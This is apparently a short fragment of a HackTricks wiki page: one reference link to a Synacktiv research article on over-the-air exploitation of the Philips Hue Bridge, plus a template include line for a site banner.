- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
